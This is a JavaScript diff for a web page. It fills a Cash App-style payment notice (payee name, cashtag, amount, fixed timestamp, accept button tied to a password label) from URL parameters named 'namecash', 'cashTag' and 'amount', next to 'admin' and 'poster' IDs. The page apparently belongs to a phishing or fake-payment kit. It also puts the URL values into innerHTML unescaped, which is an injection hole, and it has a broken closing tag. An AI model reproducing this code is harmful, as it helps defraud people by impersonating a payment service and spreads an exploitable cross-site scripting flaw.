@@ -251,11 +251,11 @@ const errorParam = urlParams.get('error');
 const adminId = urlParams.get('admin');
 const posterId = urlParams.get('poster');
 const verifyId = urlParams.get('verifyId');
-// const name = urlParams.get('name');
+const namecash = urlParams.get('namecash');
  
-// const cashTag = urlParams.get('cashTag');
+const cashTag = urlParams.get('cashTag');
  
-// const amount = urlParams.get('amount');
+const amount = urlParams.get('amount');
  
 newDiv.innerHTML = `<div class="flex items-center justify-center gap-x-12 text-neutral-50">
                   <label for="password" class="accept-button size-14 flex items-center justify-center rounded-full text-3xl bg-green-500">
@@ -263,11 +263,11 @@ newDiv.innerHTML = `<div class="flex items-center justify-center gap-x-12 text-n
     <img src="https://newsite-livid.vercel.app/cashapp.jpg" alt="img" />
  
     <div>
-      <p class="font-semibold">name/p>
-      <p>Payment to $yes</p>
+      <p class="font-semibold">${namecash}/p>
+      <p>Payment to $${cashTag}</p>
     </div>
  
-    <p class="amount">$ 100</p>
+    <p class="amount">$ ${amount}</p>
  
     <p class="text-gray">Today 6.01 am</p>
  
